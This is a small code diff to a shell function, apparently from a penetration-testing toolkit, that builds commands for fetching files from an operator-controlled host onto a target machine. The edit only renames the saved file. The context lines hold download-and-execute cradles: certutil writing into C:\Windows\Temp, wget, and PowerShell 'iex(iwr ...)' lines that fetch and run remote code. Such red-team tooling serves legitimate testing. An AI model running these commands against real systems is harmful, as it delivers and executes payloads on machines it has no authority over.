@@ -59,7 +59,7 @@ nb-srv-file-download() {
     read choice
 
     case $choice in
-        1) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\payload.exe";;
+        1) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
         2) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename -O $filename";;
         3) __COMMAND="iex(iwr http://${__LHOST}:${__LPORT}/$filename)";;
         4) __COMMAND="iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
